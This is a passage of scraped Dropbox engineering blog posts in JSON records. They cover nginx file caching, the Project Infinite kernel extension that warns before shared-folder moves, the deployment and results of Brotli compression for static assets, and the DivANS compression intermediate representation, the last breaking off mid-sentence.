open_file_cache max=10000;\nopen_file_cache_min_uses 2;\nopen_file_cache_errors on; After enabling open_file_cache you can observe all the cache misses by looking at opensnoop and deciding whether you need to tune the cache limits : Copy # opensnoop -n nginx\nPID    COMM               FD ERR PATH\n69435  nginx             311   0 /srv/site/assets/serviceworker.js\n69086  nginx             158   0 /srv/site/error/404.html\n... Wrapping up All optimizations that were described in this post are local to a single web server box. Some of them improve scalability and performance. Others are relevant if you want to serve requests with minimal latency or deliver bytes faster to the client. But in our experience a huge chunk of user-visible performance comes from a more high-level optimizations that affect behavior of the Dropbox Edge Network as a whole, like ingress/egress traffic engineering and smarter Internal Load Balancing. These problems are on the edge (pun intended) of knowledge , and the industry has only just started approaching them . We’re hiring! Do you like traffic-related stuff? Dropbox has a globally distributed edge network, terabits of traffic, millions of requests per second, and a small team in Mountain View, CA. The Traffic team is hiring both SWEs and SREs to work on TCP/IP packet processors and load balancers, HTTP/2 proxies, and our internal gRPC-based service mesh. Not your thing? We’re also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . // Tags Infrastructure Traffic Testing Nginx Performance Web Server Optimization // Copy link Link copied Link copied", "date": "2017-09-06"},
{"website": "Dropbox", "title": "Going deeper with Project Infinite", "author": ["Dd2284"], "link": "https://dropbox.tech/infrastructure/going-deeper-with-project-infinite", "abstract": "Starting from first principles Perfomance Security So Instead... But wait! There's more! Last month at Dropbox Open London, we unveiled a new technology preview: Project Infinite. Project Infinite is designed to enable you to access all of the content in your Dropbox—no matter how small the hard disk on your machine or how much stuff you have in your Dropbox. Today, we’d like to tell you more—from a technical perspective—about what this evolution means for the Dropbox desktop client. Traditionally, Dropbox operated entirely in user space as a program just like any other on your machine. With Dropbox Infinite, we’re going deeper: into the kernel—the core of the operating system. With Project Infinite, Dropbox is evolving from a process that passively watches what happens on your local disk to one that actively plays a role in your filesystem. We have invested the better part of two years making all the pieces fit together seamlessly. This post is a glimpse into our journey. Starting from first principles Our earlier prototypes around solving the “limited disk-space problem” used something called FUSE or Filesystems in Userspace. FUSE is a software interface that lets non-privileged users create their own filesystems without needing to write a kernel extension. It is part of the kernel itself on some Unix-like operating systems and OS X has a port that is available as a dedicated kernel extension and a libfuse library that needs to be linked by a program in user space. FUSE is an incredible technology, but as we gained a deeper understanding it became clear that it didn’t fully satisfy the two major constraints for our projects—world-class performance and rock-solid security. Here’s why: Perfomance Since FUSE filesystems are implemented in large part in user space, any file operation usually requires an extra user-kernel mode switch (one context switch between the application issuing the system call and the VFS in the kernel and an extra one between the FUSE kernel extension and the libfuse user space library). There’s quite a lot going on, as you can see in the illustration below. While context switches are usually quite inexpensive, this extra overhead for every file operation unfortunately leads to a degraded performance that we didn’t want our users to experience when interacting with their files in Dropbox. Security We take security seriously. We do everything we can to protect our users and their data. This includes having internal Red Teams , running a bug-bounty program, and hiring external pen-testers on a regular basis to help us discover vulnerabilities in our products. The various FUSE libraries on OS X are implemented as kernel extensions and introduce too much complexity and risk for us to feel comfortable with distributing as part of our Desktop client. So Instead... After exploring the option of using FUSE, we realized that there are many benefits to writing our own custom kernel extension: we are able to achieve minimal performance overhead while also ensuring that we understand 100% of what we’re serving to our users. And when we control the interface boundary, we can do our best to push as much non-performance critical machinery up into user space, further improving security. But wait! There's more! As we’ve been building out our kernel extension, we have also begun to look at what other long-standing user problems we can solve. It turns out there’s a lot we can do. We’ve seen the number of companies that rely on Dropbox Business soar past 150,000 since we launched it just three years ago. With so many teams on Dropbox, we increasingly hear about a scenario we call the “untrained intern problem.” Imagine you are working with a bunch of other people on a project and collaborating through a Team folder on Dropbox. Summer is quickly approaching and you’ve brought on an intern. The intern, never having used Dropbox before, moves a folder from inside their Team folder to their Desktop, not realizing that they’ve simultaneously removed access to this folder for everyone else in the company. Now of course this folder could be restored, but don’t you wish there was a better way so this could have been prevented from even happening? Rolling out today, starting with Dropbox Enterprise customers, is a better way . Now, in order to protect the organization and shared content, when someone performs such an operation, they will be warned with a dialog that looks like this: How does this work? On Windows, we use Copy Hooks , but on Mac we had to dig a little deeper. We use the Kernel Authorization (or Kauth for short) kernel subsystem in our kernel extension to manage file authorizations within the BSD portion of the kernel. By listening to actions on the KAUTH_SCOPE_VNODE scope, we can detect and deny actions that happen in the Dropbox folder. In the examples cited above, for example, we are interested in the KAUTH_VNODE_DELETE and KAUTH_VNODE_ADD_FILE actions since they allow us to check whether a file or folder in a user’s shared folder is being deleted or moved. From there, it’s just a matter of checking with the user whether the operation was in fact intended and inform them of the consequences of the operations for other members of the folder. As you can see below, this solution is much simpler than a FUSE implementation would have been, and involves no third-party dependencies. So if you’re someone who compulsively monitors the list of loaded kernel extensions on your system (there are dozens of us, dozens!) and you see com.getdropbox.dropbox.kext  you now know why! Stay tuned for more about Project Infinite as we continue to test and ultimately roll it out to a broader set of users. UPDATE (5/25/15): We wanted to address some comments about Project Infinite and the kernel. It’s important to understand that many pieces of everyday software load components in the kernel, from simple device drivers for your mouse to highly complex anti-virus programs. We approach the kernel with extreme caution and respect. Because the kernel connects applications to the physical memory, CPU, and external devices, any bug introduced to the kernel can adversely affect the whole machine. We’ve been running this kernel extension internally at Dropbox for almost a year and have battle-tested its stability and integrity. File systems exist in the kernel, so if you are going to extend the file system itself, you need to interface with the kernel. In order to innovate on the user’s experience of the file system, as we are with Project Infinite, we need to catch file operation events on Dropbox files before other applications try to act on those files. After careful design and consideration, we concluded that this kernel extension is the smallest and therefore most secure surface through which we can deliver Project Infinite. By focusing exclusively on Dropbox file actions in the kernel, we can ensure the best combination of privacy and usability. We understand the concerns around this type of implementation, and our solution takes into consideration the security and stability of our users’ experience, while providing what we believe will be a really useful feature. // Tags Infrastructure Project Infinite Smart Sync Sync // Copy link Link copied Link copied", "date": "2016-05-24"},
{"website": "Dropbox", "title": "Deploying Brotli for static content", "author": ["Alexey Ivanov"], "link": "https://dropbox.tech/infrastructure/deploying-brotli-for-static-content", "abstract": "Introduction Why Brotli Limiting scope Deployment Content Delivery Networks (CDNs) Intermediaries Browser support Results JavaScript CSS Langpacks Negative results Future work Conclusion Appendix: Hacking Brotli We're hiring! Introduction Most representations of data contain a lot of redundancy, which provides an opportunity for greater communication efficiency by compressing the content. Compression is either built-in into the data format — like in the case of images, fonts, and videos — or provided by the transportation medium, e.g. the HTTP protocol has the Accept-Encoding / Content-Encoding header pair that allows clients and servers to agree on a preferred compression method. In practice though, most servers today only support gzip. In this blog post, we are going to share our experiences with rolling out Brotli encoding for static content used by dropbox.com , decreasing the size of our static assets by 20% on average. Brotli is a modern lossless compression algorithm based on the same foundations as gzip (LZ77 and Huffman encoding), but improves them with a static dictionary, larger matching windows, and extended context modeling for better compression ratios. We won’t go into much detail on how Brotli works here; if you want to dig deeper into the compression format, you can read a great introduction to Brotli internals by Cloudflare . Why Brotli Before starting any project, we need to ask ourselves whether it is worth the engineering resources involved. In this phase, it also makes sense to investigate alternatives. Here are the two most obvious ones for this project: Improve gzip compression: LZ77 and Huffman encoding can go a long way (after all Brotli itself is using them under the hood) but there are some architectural limitations that can’t be worked around. For example, the maximum window size is limited by 32kB. Later we’ll discuss how to squeeze an additional 5-10% from the venerable deflate by using pre-compression, alternative libraries, and sometimes even data restructuring, but Brotli does even better. Use Shared Dictionary Compression : This approach was once taken by one of our engineers, Dzmitry Markovich, while he was at LinkedIn , but it has a number of downsides: Even though this compression method has been around since 2008 it still lacks support in browsers. You can try comparing the “support matrices” of SDCH and Brotli ; basically the former is only supported in Chrome-based browsers. Most server-side setups also lack support for SDCH. SDCH requires an additional static-build step to periodically update dictionaries. This will become especially complex when one needs to enable SDCH for dynamic, localized content. Limiting scope We’ll only focus on static resources for now, and skip all of the on-the-fly/online/dynamic data compression. This gives us the following benefits: Compression times do not matter (within reasonable bounds). We can always compress data with the highest possible compression settings. The size of the data is always known in advance. That way additional optimizations can be applied, like compression window tuning. Also we can use algorithms that do not support streaming. We can perform a compression-decompression round-trip, verifying that compression did not corrupt any data. This is especially useful if we are going to use less stable compression libraries (but still useful even for something as well tested as zlib ). Deployment The main problem with rolling out new compression algorithms for the Web is that there are multiple dependencies besides the server itself: in particular, web browsers and all the agents in the middle need to support it, such as Content Delivery Networks (CDNs) and proxies. Let’s go over all of these components one-by-one. Serving pre-compressed files Webservers responsible for static content usually spend their time in a repeating loop consisting of the following elements: read data compress it send compressed data to client discard compressed data, freeing memory To prevent repeated compression steps for static content, nginx has a builtin gzip_static module, which will first try looking for pre-compressed versions of files and serve them instead of wasting CPU cycles on compression of the original data. As an additional optimization, it is also possible to only store compressed versions of the files by combining gzip_static with a gunzip module to save space on disk and in the page cache. Also, decompression is usually orders of magnitude faster than compression, so the CPU hit is almost non-existent. But let’s get back to Brotli. Piotr Sikora , well known to subscribers of nginx-devel mailing list , has written an ngx_brotli module that adds support for Brotli encoding to nginx, along with brotli_static directive that enables serving of pre-compressed .br files. This solves the server-side requirements. Brotli pre-compression The biggest chunk of the actual work was adding a step to our static build pipeline that processes all the compressible MIME-types inside our static package and emits brotli-encoded versions of them. Brotli sources provide C, Java, and Python bindings. You can either use these bindings or just fork/exec the bro tool to directly compress files. The only caveat at this point is to balance the Brotli window size. Bigger compression windows lead to higher compression ratios but also have higher memory requirements during both compression and decompression, so if you are pre-compressing data for mobile devices, you may want to limit your window size. It is worth noting that there is no reason to set the compression window higher than the source file size. The window size in Brotli is specified in bits, from which the actual size is calculated via : win_size = (1 << wbits) - 16 , so you need to take these 16 bytes into an account when computing your window size. The allowed range of window sizes is currently [1KB, 16MB], though there are some talks about using brotli with large windows (up to 1GB). GZip pre-compression As an alternative to Brotli, you could try to optimize gzip for pre-compression. There is not much difference in compression ratios for zlib levels higher than 6, so pre-compression with gzip -9 on average gives less than 1% improvement over our default gzip -6 . But zlib is not the only implementation of the deflate format; luckily there are alternatives that offer various benefits: zlib-ng , intel-optimized zlib fork , and cloudflare zlib fork . These are mostly aimed at better compression speeds on modern x86_64 hardware and are generally compiled into web servers to do CPU-efficient on-the-fly compression. But since they give almost no benefit to compression ratios they do not fit our pre-compression use-case. Zopfli -based compressors spend an order of magnitude more time and produce almost optimal deflate-compatible results, yielding 3-10% of improvement over zlib. Libdeflate gives comparable compression ratios to Zopfli at a fraction of CPU time, but all of that comes at the cost of lacking any kind of streaming interfaces. This looks like a perfect candidate for our pre-compression case. 7-Zip also has deflate-compatible mode, but it performs slightly worse than libdeflate on our dataset. Content Delivery Networks (CDNs) In theory, CDNs should support Brotli transparently, the same way they currently do with gzip : if the origin properly sets the Vary: Accept-Encoding header. In practice, though, CDNs are heavily optimized for the gzip/non-gzip use-case. For example: CDNs can normalize clients’ Accept-Encoding to gzip when passing a request to the origin, store compressed version of the response in cache, and decompress data on-the-fly for clients that do not support gzip. This “optimization” can be easily spotted by collecting a distribution of Accept-Encoding values on your origin: if all the requests hitting your origin have Accept-Encoding set to gzip then your CDN most likely “normalizes” this header. Some CDNs ignore the value of the Vary header unless you explicitly ask them not to. This can potentially lead to Content-Encoding: br responses being cached and handed off to clients that do not support Brotli, regardless of their Accept-Encoding . This misbehavior is very dangerous, but can be trivially tested with a series of curl ‘s: the Content-Encoding of a cache hit response should depend on the request’s Accept-Encoding . (By the way, if you are not familiar with Vary header, you probably want to read Fastly’s blog post about best practices of using Vary .) If you are going to add the Accept-Encoding header to your cache key, you should also be aware of all the downsides: values of that header are very diverse, and therefore your CDN cache hit rate will go down. Judging by the data provided by Fastly , Accept-Encoding has a really long tail of values, and so a naive implementation of a cache key may not always work. The solution here is to normalize the header before it is passed to the upstream. You can use this code as a reference example. Intermediaries Besides an explicit middleman like a CDN, there might also be implicit proxies between the client and server, any of which may misinterpret unknown content encodings. This is commonly referred as the “Middlebox problem.” Brotli solves it by advertising support for itself only over HTTPS, so that proxy servers can’t inspect/modify content. Sadly, though, there are still some issues with corporate proxies and Anti-Virus products that intercept-and-modify TLS. Fortunately, issues like these are quite rare, and vendors are usually quick to patch them. Browser support Client side support is, fortunately, the least problematic of all. Brotli was developed by Google and hence Chrome has supported it for quite a while. Since Brotli is an open standard , other browsers have support for it as well: Firefox since the last Extended Support Release (ESR), v45 Microsoft Edge will have support for it on the next version, v15. The only straggler is Safari, which does not advertise Brotli support even in the latest Technological Preview . We did run into an unexpected issue with very old versions of Firefox 45 ESR (e.g. 45.0.*). Even though it advertises Brotli support, it couldn’t decode some files. Further digging revealed that it can’t unpack files encoded with windows smaller than original file size. As a workaround, you can either increase your window size or, if you are using nginx, implement the brotli_disable directive, which will mirror the gzip_disable behavior, but with a blacklist for brotli-misbehaving browsers. Results Enabling Brotli decreased the size of the payload fetched by users from CDN on average by 20%! Pretty pictures follow. (Oh, speaking of which, in case you’re wondering why all the graphs are in xkcd style : no reason really, it’s just fun . If your eyes bleed from the Comi^WHumorSans typeface there are links to “boring” SVGs at the bottom.) A small note about how to read the graphs. We’ve split all our static assets by type, divided each group into logarithmic size buckets from 32 bytes to 1MB, and then computed the average compression ratio win over gzip -9 for libdeflate and Brotli, respectively. Error bars represent the 95% confidence interval. For those of you who like to get all sciencey and stuff, boxplots are also attached (for the Brotli part of the dataset only) with IQR , median, min, and max stats. JavaScript Let’s start with normal (unminified) JavaScript files. The results here are good; Brotli gives an astonishing 20-25% of improvement over zlib on both small files (where its static dictionary has a clear advantage), and on huge files (where now a bigger window size allows it to beat gzip quite easily). On medium-sized files Brotli “only” gives 13-17% of improvement. Libdeflate also looks quite good: getting additional 4-5% out of gzip is a low-hanging fruit that anyone can take advantage of. Compression improvements over `gzip -9` for Javascript files broken down by original file size xkcd: PNG| SVG , normal: PNG | SVG , boxplot: PNG| SVG If we now concentrate only on minified JavaScript, which is probably the bulk of any website right now, then Brotli maintains its compression ratios, except for the biggest filesizes. But as you can see from the wide confidence intervals in the box plots, we do not have enough samples there. Libdeflate drops to a stable ~3% of improvement over zlib. Compression improvements over `gzip -9` for minified Javascript files broken down by original file size xkcd: PNG | SVG , normal: PNG | SVG , boxplot: PNG | SVG CSS Stylesheets have even better compressibility in Brotli’s case: now it ranges between 20-30%, while libdeflate gets around 4%. This is most likely due to the huge redundancy of the CSS format. Compression improvements over `gzip -9` for CSS files broken down by original file size xkcd: PNG | SVG , normal: PNG | SVG , boxplot: PNG | SVG Langpacks The biggest benefits for Brotli are observed on Cyrillic and Asian languages — upto 31% (most likely due to their larger size, which benefit from Brotli’s larger compression window size). Other languages gets “only” around 25%. Libdeflate is now closer to 5%. Compression improvements over `gzip -9` for different languages xkcd: PNG | SVG , normal: PNG | SVG Negative results The previous section was actually the second most important part of this post — this section is actually the most important! I’m personally a big fan of sharing negative results, so let me also discuss what we did not get from rolling out Brotli: a major web performance win. Internally, our main performance metric is Time-To-Interactive (TTI) — i.e., the amount of time it takes before the user can interact with a web page — and we saw only a minor benefit of rolling out Brotli on the 90th-percentile (p90) TTI stats, mainly because: Client-side caching works : We store our static files in a content-addressable storage . That, along with proper handling of the If-None-Match and If-Modified-Since headers, causes minimal cache hit disturbances during static deployments. CDNs are fast : We are currently using Cloudflare as our main CDN. They have over 100 PoPs around the world , which implies that content download is unlikely to be a bottleneck. Users of our website are mostly coming from stable internet links : Users coming from mobile ISPs are more likely to use the native Android/iOS apps, which don’t access static assets from a CDN. Not all browsers support Brotli : Yeah, Safari, we are talking about you! Modern websites are very Javascript-heavy : Sometimes it may take multiple seconds just to parse, compile, execute javascript, and render the webpage. Therefore, the bottleneck is often the CPU, not network bandwidth. All of this means that you won’t get a 20% TTI win from 20% smaller static files. But that does not mean Brotli was not worth it! Infrequent users of our site, especially those on lossy wireless links or costly mobile data plans will definitely appreciate the improved compression ratios. On the efficiency side, pre-compression also removed any CPU usage from our web tier serving static content, reducing overall CPU usage by ~15%. Future work Compressing dynamic data The next logical step is to start compressing non-static data with Brotli. This will require a bit more R&D since compression speed now becomes rather crucial. The Squash benchmark can give a ballpark estimation of the compression speed/ratio tradeoff: enwiki8 compression ratio vs compression speed (Here, we’d like to be as close to the top-right corner as possible — both fast compression speeds and high compression ratios.) However, it’s actually even more complicated that this chart suggests, since now we need to optimize for (compression_time + transfer_time + decompression_time) while also keeping internal buffering inside our proxy tier at a minimum. An example of bad internal buffering is zlib in the nginx gzip module , where enabling gzip without disabling proxy buffering may lead to excessive buffering. With all of that considered, we will keep a close eye on both Time-To-First-Byte (how fast the client starts to receive data) and Time-To-Last-Byte (how fast the client finishes receiving all data) changes during the Brotli rollout for dynamic content. It will take us a bit of time to collect enough data to fully explore this, but for now using Brotli with quality set to 5 seems like a good trade-off between compression speed and compression ratio for dynamic data, based on preliminary results. Image compression data On average, only 10% of downloaded bytes are attributed to images, but there are outlier pages, such as landing pages which can be 80% images. Brotli won’t help with those, but that doesn’t mean we can’t do other things. There are many tools that you can plug into your static build pipeline to reduce the size of images. The specific tool to use depends on the image format: You can try to optimizing JPEG size (and their Time-To-View) in many different ways: Vary quality U s e different progressive scans Switch to a different encoder, e.g. mozjpeg or guetzli To get a proper result, all of these require having access to the original non-compressed image, since recompressing JPEGs leads to very poor results . On our backend, we are losslessly compressing JPEGs by 22% using Lepton . We also have a prototype of a Javascript Lepton decoder built with Emscripten , but it is not yet fast enough to be used on the web. PNG, on the other hand, is a deflate -based format, so it can be optimized using the same zlib tricks we've discussed earlier. Zopfli has built-in support for losslessly optimizing PNG files via the zopflipng tool (unless you strip metadata chunks from the image). There are other tools that can do that as well, e.g. advancecomp by Andrea Mazzoleni. You can also go with a lossy approach and convert 24bit RBGA images to an 8bit palette, using tools like pngquant . Finally, you can also encode images in multiple formats, and if your CDN supports caching based on the Accept header, then you can serve, e.g., webp images to browsers that support it . Currently we use pngquant to optimize our sprite files for our website, which shrinks their size to ~25% of the original size, cutting down each page size by almost 300kB. We can get an additional 5% out of deflate if we run ZopfliPNG/``advpng on top of it. A final fun fact: because of the rather limited back-reference distance of gzip , grouping visually similar sprites closer together will yield better compression ratios! The same trick can be generally applied to any deflate -compressed data; for example, we sort our langpacks so they compress better. Conclusion It took us around 2 weeks to modify our static asset pipeline, add support for serving pre-compressed files to our webservers, and modify CDN cache behavior, test and deploy Brotli to production at Dropbox. This one-time effort enabled us to have 20% smaller static asset footprint from now on for all 500 million of our users! Appendix: Hacking Brotli I mentioned that this post wouldn’t go too much into the Brotli internals, but if you want those nitty-gritty details, here are some WebFonts Working Group presentations: a brief comparison between Brotli and gzip a specification outline As usual, the most authoritative and full overview is the standard itself: RFC7932 (don’t worry that it is 132 pages long — two thirds of it is just a hex dump of Brotli’s static dictionary ). Speeding up Brotli Some time ago we’ve blogged about data compression using Brotli on our backend and some modifications we’ve made to it so it can compress quite a bit faster. This ended up as the “q9.5” branch on the Brotli’s official github . However, since this post was about using offline compression for static assets, we are using maximum quality settings here so that we can get the maximum benefits from the compression. Brotlidump Within the /research directory of the Brotli project there are many interesting tools, mostly aimed at exploring underlying file format and visualizing backreferences. One notable tool is brotlidump.py — a self-sufficient utility to parse Brotli-compessed files. I’ve used it frequently to look into resulting .br files, e.g. to check window size or inspect context maps. Custom dictionaries If you are looking at Brotli for compressing data internally, especially if you have a lot of small and similarly formatted files (e.g. a bunch of JSONs or protobufs from the same API), then you may increase your compression ratio by creating a custom dictionary for your data (the same way SDCH does it). That way you don’t have to rely on Brotli’s built-in static dictionary matching your dataset, and you also won’t have the overhead of constructing almost the same dynamic dictionary for each tiny file. Support for custom dictionaries exists in Brotli’s Python bindings if you want to play with it. As for constructing dictionaries from a sample of files, I would recommend Vlad Krasnov’s dictator tool . We're hiring! Do you like traffic-related stuff? Dropbox has a globally distributed edge network, terabits of traffic, millions of requests per second, and a small team in Mountain View, CA. The Traffic team is hiring both SWEs and SREs to work on TCP/IP packet processors and load balancers, HTTP/2 proxies, and our internal gRPC-based service mesh. Not your thing? We’re also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . // Tags Infrastructure Web Brotli Static Content Compression // Copy link Link copied Link copied", "date": "2017-04-06"},
{"website": "Dropbox", "title": "Building better compression together with DivANS", "author": ["Daniel Reiter Horn"], "link": "https://dropbox.tech/infrastructure/building-better-compression-together-with-divans", "abstract": "The DivANS IR Compressing the DivANS IR Experimental Results Closing Thoughts Compressing your files is a good way to save space on your hard drive. At Dropbox’s scale, it’s not just a good idea; it is essential. Even a 1% improvement in compression efficiency can make a huge difference. That’s why we conduct research into lossless compression algorithms that are highly tuned for certain classes of files and storage, like Lepton for jpeg images, and Pied-Piper-esque lossless video encoding . For other file types, Dropbox currently uses the z lib compression format, which saves almost 8% of disk storage. We introduce DivANS , our latest open-source contribution to compression, in this blog post. DivANS is a new way of structuring compression programs to make them more open to innovation in the wider community, by separating compression into multiple stages that can each be improved independently: DivANS System Diagram DivANS System Diagram The DivANS Compressor operates in 3 stages (top part of diagram): Taking a raw stream of bits from an original file and converting it to a common “Intermediate Representation” (IR) by calling into a plugin. We define a text-based format for a simple but effective IR, partially based on the internal representation that Brotli uses during compression. By making this IR explicit and standardized, researchers can modify any compression algorithm to emit the same IR, which can then be consumed by the following pieces. Taking an IR as input and optimizing it, resulting in a better IR. We have implemented a few simple optimizers for our IR so far, but having a standardized IR format allows researchers to experiment with all kinds of different optimizers. Taking an IR as input and converting it to a format that can be efficiently written out as bits (e.g., to a file) using a standard compression technique. The text format for IRs we have defined is not itself very compact; for example, it will typically be quite a bit larger than the compressed bitstream that Brotli emits. However, we have developed a technique for efficiently converting the IR into a set of probability tables that can be consumed by modern compressors to output the final stream of bits, with compression ratios competitive with the state of the art. Conversely the DivANS Decompressor operates in just 2 stages (bottom part of diagram): Taking a DivANS bitstream and converting it into an IR representation Interpreting the IR representation to return the original file At first glance, splitting a “single” operation into multiple steps might seem like adding unnecessary complexity. However, it’s instructive to consider the example of language compilers. Primitive compilers compiled a single programming language down to a single machine architecture, conceptually in a “single” operation. At some point in the evolution of compilers, intermediate representations were introduced which, while adding steps to the compilation process, had several advantages that helped propel the field forward: Compilers could accept multiple input languages (C, FORTRAN, Ada, C++, …) and emit the same IR for each Compilers could apply numerous kinds of optimizations to transform the IR into more efficient code, such as removing dead code, inlining functions, eliminating common subexpressions and propagating constants. Compilers could emit machine code for multiple architectures (x86, x86-64, arm, ppc, …) Crucially, by standardizing on an IR format, it was possible for researchers to work on all of these problems in parallel (independently). We hope to spur the same kinds of benefits for the field of compression with the introduction of the DivANS IR. In preliminary studies, we have already found concrete gains of 2% in compression ratios for many types of files by using DivANS. We describe these experiments in more detail later on in the post. In addition, we designed DivANS to also meet the following requirements: Be secure and deterministic/reproducible Decode at more than 100Mbit in a streaming manner Have better compression ratios than the best known methods that also satisfy these two properties The DivANS IR We chose to develop an IR that uses a Lempel-Ziv (LZ)-based representation of a compressed file. In an LZ representation, there are only 3 kinds of instructions for generating the stream of bytes of the original file: insert : Insert fresh bytes directly (known as literals), using an entropy code (e.g. a Huffman code ). This is the “base case” when you have never seen this data before in any form. copy : Copy previously seen byte data from somewhere else in file. Most files have a fair amount of repetition internally, which we can exploit. dict : Copy data from a predefined dictionary, possibly with some small alterations. There are many kinds of data that repeat not just within a file, but across files. For example, you would expect to see words like “the”, “and”, “that” occur very frequently across all English text documents. Given a sequence of such commands, we can exactly (losslessly) reconstruct any input stream, but not necessarily very compactly. To achieve compression, we need to be able to predict future bytes based on what we’ve seen so far. This is achieved via the use of several probability tables, that contain statistics of various types. For example, consider a file that consists of alternating chunks of bits all set to 1, and then bits all set to 0. In this case, we’d like to give the compressor a “hint” that says: “if you’re in a ’1’ chunk, then you should assume that the next bits are going to be 1 as well, but if you’re in a ’0’ chunk, then you should assume the next bits are going to be 0.” Thus, our IR defines a few kinds of such hints, which can help the compressor generate smaller files. These include prediction : these are the probability tables themselves. Each of these corresponds to a “situation” in which you can guess what kind of bytes are likely to come next. In the example described above, we might have 2 tables, each of which would say that the probability of 1 or 0 is almost 100%. btype{l,c,d} : these are pointers into different parts of the probability tables. In our running example, we would have one of these commands every time we alternate between chunks, to say “now use the probability table for 1s (or 0s) to make your predictions.” Note that these hints are completely optional—compressors and interpreters are free to ignore these lines and can still get back the original input—but they add enough flexibility to the IR to allow for many kinds of optimizations. Since there are an infinite number of IRs that describe the same stream of bytes, the key is to find the most efficient versions. In general, this is a balancing act between the extra space it takes to describe probabilities vs the space saved by using them; if this is done badly, it might be more efficient to just insert the bytes directly! IR generation example Below is an example of the IR generated from a compression of the test string, “It snowed, rained, and hailed the same morning.” Blue letters indicate fresh data insertions, green letters indicates copies from previously in the file, and red letters indicate data pulled from the Brotli dictionary. Interpretation of DivANS IR Here's what the IR looks like for this example: Copy insert 2 \"It\"\ndict 5 word 4,649 \"snow\" func 6 \" snow\"\ninsert 3 \"ed,\"\ndict 5 word 4,288 \"rain\" func 6 \" rain\"\ncopy 4 from 8\ndict 5 word 12,552 \"and his wife\" func 48 \"and h\"\ncopy 2 from 12\ninsert 1 \"l\"\ncopy 2 from 12\ndict 10 word 9,648 \"the same \" func 6 \" the same \"\ndict 8 word 7,352 \"morning\" func 20 \"morning.\" Notice that only the initial “It”, the first “ed”, and the “l” in hailed are inserted from “scratch”; everything else is copied, either from previously in the sentence or from the dictionary (with small alterations). Interactive IR Demo You can see an expanded version of this example, as well as try DivANS on your own files (up to 2MB) interactively at https://dropbox.github.io/divans . Files larger than a megabyte tend to do better in DivANS. Compressing the DivANS IR Once we have an IR file, possibly optimized in various ways, we need to serialize it to a stream of bytes that can be efficiently compressed. We rely on Asymmetrical Numeral System (ANS) , a method introduced by Dr. Jarek Duda that matches the compression ratio of the more commonly used arithmetic coding , while being considerably faster. These methods offer compression performances close to the theoretical bound—for instance, we showed in our previous blog post on Lepton that transcoding JPEGs previously encoded with Huffman coding with arithmetic coding can reduce the file size by 22%. These are all entropy coding methods, which attempt to encode each symbol using a number of bits that is inverse of the probability of observing the symbol, i.e., common things are encoded using fewer bits than rarer things. There are theoretical guarantees that this is the most optimal compression scheme, but in practice, the actual compression efficiency is determined by how good your estimates of the probabilities are. Adaptively Computing Probabilities DivANS provides the ANS coder with dynamically updated probabilities to achieve maximum compression. It does so by creating a table of Cumulative Distribution Functions (CDFs), known as the prior table, which describes the probabilities of different output symbols in different contexts. DivANS then updates them continuously as the file is processed. In the following discussion, note that DivANS decodes files in chunks of 4 bits (1 nibble) at a time, and each nibble is a symbol for the ANS coder. The full code is here , but the key takeaway is that several bits from recently observed bytes in the file are used to index into the prior table, where each CDF in the table can be thought of as a “situation.” Example situations could be: A consonant was just seen, so a vowel or repeat consonant are likely. A period and space were just seen, so a capital letter is likely to follow. A number was seen, so another number (or comma) is likely to follow. The situations aren’t limited to literal characters only, and can apply to the IR itself, such as The last few copy commands referenced data 25 bytes ago; so the next copy command may also reference data around 25 bytes ago. The last string literals was 3 bytes long before a copy was seen, so the next batch of literals is also likely to be short. DivANS uses a selected few of the bits of previous bytes to index into a large table of CDFs, represented as a cube in the diagram below. You can think of this as a lookup function that takes as input recent nibbles and outputs a probability value for the next nibble. Note that it is possible to implement a different set of rules, or even infer rules or the underlying CDF more generally with a deep-learning approach (e.g. with an RNN ). Encoding the low nibble of ‘i’ After the next nibble is read, the prior probabilities are adjusted based on the actual value of the nibble. Initially, DivANS assumes equal probabilities for all outputs, and updates them as it goes through the file. One could also encode knowledge about numbers and capitalization rules to begin with, but we instead learn the CDFs without any such assumptions. As the file is encoded and similar situations are encountered over and over, the CDFs start to converge to accurate guesses for future nibbles. When decoding the compressed byte stream back into the IR, DivANS follows the same procedure to update probability tables so that they can be used to reconstruct what the original symbols would have been, given the actual bytes written to the stream. Note that decoding and encoding have to operate in opposite order of each other; for speed, DivANS encodes in reverse and can therefore decode in forward order. Experimental Results Test datasets We tested DivANS on two datasets. One was the well-known S ilesia corpus, which contains medical images, giant html files, and books. However, this dataset has very different compression characteristics than the data stored in Dropbox, so we sampled 130,000 random chunks being uploaded to Dropbox. We measured the sizes and compression (encode) and decompression (decode) rates of DivANS, and several alternative algorithms (zlib, Brotli, Zstd, 7zip, bz2). For DivANS and Brotli, we compared 2 different compression levels (q9 and q11). For zlib, 7zip, bz2 and Zstd, we used maximum settings. All tests were performed on 2.6 GHz Intel Xeon E5 2650v2 servers in the Dropbox datacenters and no data chunks from the test were persisted. Since Dropbox uses Lepton to compress image files, we only benchmark files where the Lepton compressor was not effective and where zlib obtains at least 1% compression to avoid measuring compression of files that already have a compression algorithm applied. This focuses the test data set down to one third of the uploaded files. Measurements Compression ratios on Dropbox chunks dataset, as % saving vs zlib. Final file size is (100% – Savings) * zlib’s size. Higher is better. Measuring the Dropbox dataset, DivANS q11 saves 12% over zlib, and more than 2.5% over other algorithms at maximum settings. If we choose to include files in the benchmark where neither zlib nor Lepton are effective, the benchmark covers all non-JPEG files, comprising two thirds of the uploaded files. Compression ratios on Dropbox chunks dataset including compressed files, Higher is better. DivANS usually cannot get much extra savings out of the already-compressed files, but on some of the files it can be significantly more efficient than zlib. However, 88% of the overall savings from DivANS comes from processing the third of files that zlib is most effective upon. Performance on Dropbox chunks dataset. Higher is better. At these settings, DivANS and Brotli have similar encoding speeds. However, DivANS decode times are still five times slower than Brotli. This is because Brotli decompresses bytes using just a pair of table lookups and some bookkeeping, whereas DivANS has to maintain probability models for each nibble decoded and uses several vector instructions to maintain the CDFs and the ANS state. We expect that a few straightforward optimizations to improve the bookkeeping will bring the speed up a bit, to more than 200Mbps. For the Silesia corpus, DivANS q11 gets 2.7% space savings over Brotli and Zstd but lags behind 7zip. However, as mentioned earlier, Silesia is not very representative of Dropbox data. Compression ratios and performance on Silesia Benchmark. Higher is better. Hybrid LZMA/Brotli Compression IR Mashup Notice that the 7zip LZMA algorithm does better on Silesia. This is because LZMA’s produced IR better fits one of the included binary files ( mozilla ), which occupies 20% of the archive. As a proof of concept, we demonstrated the flexibility of the IR to capture real-world compression gains. We added 3 print statements 